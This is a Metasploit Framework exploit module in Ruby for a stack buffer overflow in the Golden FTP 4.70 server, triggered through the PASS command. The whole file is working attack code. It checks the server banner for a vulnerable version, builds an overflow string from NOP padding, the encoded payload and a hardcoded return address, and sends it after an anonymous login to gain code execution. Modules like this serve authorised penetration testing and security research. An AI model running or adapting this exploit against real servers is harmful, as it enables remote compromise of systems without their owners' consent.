#
# $Id: goldenftp_pass_bof.rb 12812 2011-06-02 01:10:22Z bannedit $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'GoldenFTP PASS Stack Buffer Overflow\',
			\'Description\'    => %q{
					This module exploits a vulnerability in the Golden
				FTP service. This module uses the PASS command to trigger the overflow.
			},
			\'Author\'         => [ \'bannedit\' ],
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 12812 $\',
			\'References\'     =>
				[
					[ \'BID\', \'45957 \'],
					[ \'URL\', \'http://www.exploit-db.com/exploits/16036/\'],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'seh\',
				},
			\'Privileged\'     => false,
			\'Payload\'        =>
				{
					\'Space\'    => 350,
					\'BadChars\' => \"\\x00\\x0a\\x0d\",
				},
			\'Platform\'       => [\'win\'],
			\'Targets\'        =>
				[
					[
						\'Golden FTP 4.70 Universal\', # Tested OK - bannedit 05/31/2011
						{
							\'Platform\' => \'win\',
							\'Ret\'      => 0x00a93ca6,
						},
					]

				],
			\'DisclosureDate\' => \'Jan 23 2011\'))
	end
	
	def check
		connect
		disconnect
		print_status(\"FTP Banner: #{banner}\".strip)
		if banner =~ /Golden FTP Server ready v(4\\.\\d{2})/ and $1 == \"4.70\"
			return Exploit::CheckCode::Appears
		else
			return Exploit::CheckCode::Safe
		end
	end

	def exploit
		if datastore[\'RHOST\'].length < 15
			pad = make_nops(1) * (15 - datastore[\'RHOST\'].length)
		end
		
		sploit = make_nops(4) * 38
		sploit << payload.encoded
		sploit << pad
		sploit << make_nops(1) * (528 - sploit.length)
		sploit << [target.ret].pack(\'V\')

		print_status(\"Connecting to #{datastore[\'RHOST\']}:#{datastore[\'RPORT\']}\")
		begin
			connect
			send_user(\"anonymous\")
			send_cmd([\'PASS\', sploit], false)
			handler
		rescue EOFError
		end
	end
end